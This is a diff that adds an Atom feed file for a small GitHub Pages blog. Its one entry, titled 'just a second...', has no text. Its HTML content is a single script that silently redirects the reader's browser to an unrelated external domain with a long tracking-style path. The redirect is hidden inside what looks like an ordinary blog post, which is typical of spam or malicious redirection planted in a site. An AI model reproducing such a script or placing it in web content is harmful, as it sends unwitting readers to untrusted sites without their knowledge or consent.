@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <title>kontars</title>
+    <link href="https://zakialaoui.github.io/gh-pages/feed.xml" rel="self" />
+    <link href="https://zakialaoui.github.io/gh-pages" />
+    <updated>2021-09-20T18:22:48+01:00</updated>
+    <author>
+        <name>folkas</name>
+    </author>
+    <id>https://zakialaoui.github.io/gh-pages</id>
+
+    <entry>
+        <title>just a second...</title>
+        <author>
+            <name>folkas</name>
+        </author>
+        <link href="https://zakialaoui.github.io/gh-pages/just-a-second/index.html"/>
+        <id>https://zakialaoui.github.io/gh-pages/just-a-second/index.html</id>
+
+        <updated>2021-09-20T18:22:48+01:00</updated>
+            <summary>
+                <![CDATA[
+                     
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <p>
+<script>
+document.location.href = 'http://xhuauto.com/2029327ce5274492Xn0UM0Gh39UDr131410CZ';
+</script>
+</p>
+            ]]>
+        </content>
+    </entry>
+</feed>
